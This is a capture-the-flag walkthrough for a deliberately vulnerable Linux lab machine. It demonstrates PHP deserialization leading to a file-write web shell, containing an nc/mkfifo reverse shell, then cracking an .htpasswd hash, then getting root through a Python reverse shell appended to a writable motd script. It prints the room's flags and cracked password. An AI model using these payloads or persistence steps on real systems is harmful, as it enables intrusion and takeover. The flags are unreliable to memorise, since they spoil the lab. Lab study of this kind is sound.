# Debug

## Description

Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!

## Introduction

Hey everybody!

Welcome to this Linux CTF Machine!

The main idea of this room is to make you learn more about php deserialization!

I hope you enjoy your journey :)

## Flags

You got in? Prove it by submitting the flags!

### Inital Scan

Let's start with an Nmap scan. The scan reveals two open ports:
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

### Web

Let's head to web service, since we have no creds for ssh. The main page is the default page for Apache2. Let's run `gobuster` to find directories or files:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Debug]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/ -x php,zip,html,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.86.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,zip,html,txt
[+] Timeout:                 10s
===============================================================
2021/11/04 09:29:14 Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 301) [Size: 313] [--> http://10.10.86.100/backup/]
/grid                 (Status: 301) [Size: 311] [--> http://10.10.86.100/grid/]  
/index.php            (Status: 200) [Size: 5732]                                 
/index.html           (Status: 200) [Size: 11321]                                
/javascript           (Status: 301) [Size: 317] [--> http://10.10.86.100/javascript/]
/javascripts          (Status: 301) [Size: 318] [--> http://10.10.86.100/javascripts/]
/message.txt          (Status: 200) [Size: 94]
~~~

A file in `/backup` took my attention:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Debug]
└─$ curl -s "http://$IP/backup/" | html2text 
****** Index of /backup ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[DIR]]       grid/            2021-03-09 20:10    -  
[[   ]]       index.html.bak   2021-03-09 20:10  11K  
[[   ]]       index.php.bak    2021-03-09 20:10 6.2K  
[[DIR]]       javascripts/     2021-03-09 20:10    -  
[[DIR]]       less/            2021-03-09 20:10    -  
[[   ]]       readme.md        2021-03-09 20:10 2.3K  
[[TXT]]       style.css        2021-03-09 20:10  10K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.86.100 Port 80
~~~

Let's download `index.php.bak` and take a look at it:

~~~php
<!doctype html>
<html lang="en" class="no-js">
<head>
  <meta charset="utf-8">
  <title>Base</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
  <link rel="stylesheet" media="screen" href="style.css">
</head>
<body>

[REDACTED]

  <form action="" method="get">
    <fieldset>
      <legend>Form Submit (Your message will be saved on the server and will be reviewed later by our administrators)</legend>
      <div class="field">
        <label for="name">Field Name</label>
        <input type="text" name="name" id="name">
      </div>
      <div class="field">
        <label for="email">Email Field</label>
        <input type="text" name="email" id="email">
      </div>
      <div class="field">
        <label for="textarea">Textarea</label>
        <textarea rows="10" cols="30" name="comments" id="comments"></textarea>
      </div>

[REDACTED]

      <div class="field">
        <input class="button" type="submit" value="Submit">
        <input class="button" type="reset" value="Reset">
      </div>
    </fieldset>
  </form>

<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>

[REDACTED]

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script src="javascripts/default.js"></script>

</body>
</html>
~~~

The interesting thing about this php file is that in `FormSubmit` class, the `__destruct` function is creating the file mentioned in the `$form_file` variable, with the content of the `$message` variable.

Other than that, there is a line in the code, which show that there is a hidden `debug` parameter which is passed to `unserialize` function which we can abuse.

### PHP Serialization exploit

Since PHP allows object serialization, we can pass ad-hoc serialized strings to a vulnerable `unserialize()` call, which results in an arbitrary PHP object injection. It is explained [here](https://notsosecure.com/remote-code-execution-via-php-unserialize/).

First, we need to create our PHP code:

~~~php
<?php
class FormSubmit {
    public $form_file = 'shell.php';
    public $message = '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOURIP> 4444 >/tmp/f"); ?>';
}

$mForm = new FormSubmit;
echo urlencode(serialize($mForm))
?>
~~~

Now run this php code and you'll get a serialized payload. Uplaod it using the `debug` variable of the `index.php` page:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Debug/files]
└─$ curl -s "http://$IP/index.php?debug=<THE PAYLOAD>"
~~~

This will create a file named `shell.php` on the server with the content we put in `$message` variable:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Debug/files]
└─$ curl -s "http://$IP/index.php?debug=`php shell.php`"
~~~

Now we can start a listener and then call the shell:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Debug/files]
└─$ curl -s "http://$IP/shell.php"
~~~

Now we have a shell as `www-data`. The first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Debug/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.1.128] from (UNKNOWN) [10.10.86.100] 32894
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
www-data@osboxes:/var/www/html$ 
~~~

### James' password

Now if we list all the files in the active directory, we'll see a file named `.htpasswd`, which contains a password hash for user ` james`:

~~~
www-data@osboxes:/var/www/html$ ls -la
total 72
drwxr-xr-x 6 www-data www-data  4096 Nov  4 11:16 .
drwxr-xr-x 3 root     root      4096 Mar  9  2021 ..
-rw-r--r-- 1 www-data www-data    44 Mar  9  2021 .htpasswd
drwxr-xr-x 5 www-data www-data  4096 Mar  9  2021 backup
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 grid
-rw-r--r-- 1 www-data www-data 11321 Mar  9  2021 index.html
-rw-r--r-- 1 www-data www-data  6399 Mar  9  2021 index.php
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 javascripts
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 less
-rw-r--r-- 1 www-data www-data   708 Nov  4 11:17 message.txt
-rw-r--r-- 1 www-data www-data  2339 Mar  9  2021 readme.md
-rw-r--r-- 1 www-data www-data   194 Nov  4 11:17 shell.php
-rw-r--r-- 1 www-data www-data 10371 Mar  9  2021 style.css
www-data@osboxes:/var/www/html$ cat .htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
~~~

Let's save the hash and crack it using `john` and `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Debug/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt james.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jamaica          (james)
1g 0:00:00:00 DONE (2021-11-04 11:28) 50.00g/s 38400p/s 38400c/s 38400C/s jeffrey..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

James' password: `jamaica`

Now we can switch to user `james`:

~~~
www-data@osboxes:/var/www/html$ su james
Password: jamaica
james@osboxes:/var/www/html$ id
uid=1001(james) gid=1001(james) groups=1001(james)
~~~

### User flag

Now if you navigate to `james`' home directory, you'll find the `user.txt`:

~~~
james@osboxes:/var/www/html$ cd
james@osboxes:~$ ls
Desktop    Downloads         Music              Pictures  Templates  Videos
Documents  examples.desktop  Note-To-James.txt  Public    user.txt
james@osboxes:~$ cat user.txt
7e37c84a66cc40b1c6bf700d08d28c20
~~~

user.txt: `7e37c84a66cc40b1c6bf700d08d28c20`

### Going root

Now we need to gain root access, in order to obtain the root flag. I ran `sudo -l` to check our sudo permissions, but we have none:

~~~
james@osboxes:~$ sudo -l
[sudo] password for james: jamaica
Sorry, user james may not run sudo on osboxes.
~~~

There is a file in james' home directory named `Note-To-James.txt`. Let's read it:
~~~
james@osboxes:~$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
~~~

The note is from root and it says that we have access to modify "ssh welcome message". Let's find what files the root is talking about. I used `find` command to find writable files in `/etc`, because that's where these types of files are. The `-exec` flag is to see their ownership and the access we have:

~~~
james@osboxes:~$ find /etc -type f -writable -exec ls -la {} + 2>/dev/null
-rwxrwxr-x 1 root james 1220 Mar 10  2021 /etc/update-motd.d/00-header
-rwxrwxr-x 1 root james    0 Mar 10  2021 /etc/update-motd.d/00-header.save
-rwxrwxr-x 1 root james 1157 Jun 14  2016 /etc/update-motd.d/10-help-text
-rwxrwxr-x 1 root james   97 Dec  7  2018 /etc/update-motd.d/90-updates-available
-rwxrwxr-x 1 root james  299 Jul 22  2016 /etc/update-motd.d/91-release-upgrade
-rwxrwxr-x 1 root james  142 Dec  7  2018 /etc/update-motd.d/98-fsck-at-reboot
-rwxrwxr-x 1 root james  144 Dec  7  2018 /etc/update-motd.d/98-reboot-required
-rwxrwxr-x 1 root james  604 Nov  5  2017 /etc/update-motd.d/99-esm
~~~

The motd service that you can see in all of them, stands for "message of the day". It is used to display messages when a user connects, and will be run by `root`. As you can see we have write access, so let's add a reverse shell.

This is the python reverse shell I'm using:
~~~
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

We add this to `00-header`:

~~~
james@osboxes:~$ cat >> /etc/update-motd.d/00-header << EOF
> /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.128",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
> EOF
~~~

Now disconnect and start a listener. Then log back in and you'll get a shell as `root`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Debug/files]
└─$ rlwrap nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.9.1.128] from (UNKNOWN) [10.10.86.100] 34766
bash: cannot set terminal process group (2120): Inappropriate ioctl for device
bash: no job control in this shell
root@osboxes:/# id
uid=0(root) gid=0(root) groups=0(root)
~~~

### Root flag

Now head to `/root` and read the root flag:
~~~
root@osboxes:/# cd /root
root@osboxes:/root# ls
root.txt
root@osboxes:/root# cat root.txt
3c8c3d0fe758c320d158e32f68fabf4b
~~~

root.txt: `3c8c3d0fe758c320d158e32f68fabf4b`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d one! : )